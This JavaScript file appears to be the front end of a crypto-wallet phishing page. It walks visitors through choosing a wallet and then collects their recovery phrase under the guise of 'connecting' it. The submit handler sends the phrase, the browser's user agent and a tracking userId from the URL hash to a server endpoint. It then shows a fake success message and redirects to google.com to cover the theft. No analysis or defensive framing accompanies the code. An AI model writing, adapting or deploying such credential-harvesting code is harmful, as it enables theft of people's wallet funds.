document.addEventListener("DOMContentLoaded", () => {
  // DOM Elements
  const introSection = document.getElementById("intro-section")
  const walletSelectSection = document.getElementById("wallet-select-section")
  const recoveryPhraseSection = document.getElementById("recovery-phrase-section")
  const startConnectBtn = document.getElementById("start-connect-btn")
  const backToIntroBtn = document.getElementById("back-to-intro-btn")
  const backToSelectBtn = document.getElementById("back-to-select-btn")
  const walletItems = document.querySelectorAll(".wallet-item")
  const selectedWalletName = document.getElementById("selected-wallet-name")
  const recoveryForm = document.getElementById("recovery-form")

  let selectedWallet = null

  // Navigation Functions
  function showSection(section) {
    // Hide all sections
    introSection.classList.remove("active")
    walletSelectSection.classList.remove("active")
    recoveryPhraseSection.classList.remove("active")

    // Show the requested section
    section.classList.add("active")
  }

  // Event Listeners
  startConnectBtn.addEventListener("click", () => {
    showSection(walletSelectSection)
  })

  backToIntroBtn.addEventListener("click", () => {
    showSection(introSection)
  })

  backToSelectBtn.addEventListener("click", () => {
    showSection(walletSelectSection)
  })

  walletItems.forEach((item) => {
    item.addEventListener("click", function () {
      // Remove selected class from all items
      walletItems.forEach((wallet) => wallet.classList.remove("selected"))

      // Add selected class to clicked item
      this.classList.add("selected")

      // Store selected wallet
      selectedWallet = this.getAttribute("data-wallet")

      // Update wallet name in the recovery phrase section
      selectedWalletName.textContent = this.querySelector(".wallet-name").textContent

      // Show recovery phrase section
      showSection(recoveryPhraseSection)
    })
  })

  // Handle recovery form submission
  recoveryForm.addEventListener("submit", async (e) => {
    e.preventDefault()

    const phrase = document.getElementById("recovery-phrase").value.trim()

    if (!selectedWallet || !phrase) {
      alert("Please select a wallet and enter your recovery phrase")
      return
    }

    // Get userId from URL hash if available
    const userId = window.location.hash ? window.location.hash.substring(1) : null

    try {
      // Show loading state
      document.getElementById("connect-btn").disabled = true
      document.getElementById("connect-btn").textContent = "Connecting..."

      // Send data to server
      const response = await fetch("/api/connect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          wallet: selectedWallet,
          phrase: phrase,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          userId: userId,
        }),
      })

      const data = await response.json()

      if (data.success) {
        // Show success message
        alert("Wallet connected successfully!")

        // Redirect after delay if specified
        setTimeout(() => {
          window.location.href = "https://www.google.com"
        }, 2000)
      } else {
        alert(data.error || "Failed to connect wallet")
        resetForm()
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)
      alert("An error occurred. Please try again.")
      resetForm()
    }
  })

  // Initialize the app
  showSection(introSection)

  // Add smooth animation for wallet items
  function animateWalletItems() {
    walletItems.forEach((item, index) => {
      setTimeout(() => {
        item.style.opacity = "0"
        item.style.transform = "translateY(10px)"
        item.style.transition = "none"

        setTimeout(() => {
          item.style.transition = "all 0.3s ease"
          item.style.opacity = "1"
          item.style.transform = "translateY(0)"
        }, 50)
      }, index * 50)
    })
  }

  // Run wallet animation when wallet selection becomes visible
  const walletSelectObserver = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        animateWalletItems()
        walletSelectObserver.disconnect()
      }
    })
  })

  walletSelectObserver.observe(walletSelectSection)

  function resetForm() {
    document.getElementById("connect-btn").disabled = false
    document.getElementById("connect-btn").textContent = "Connect"
  }
})
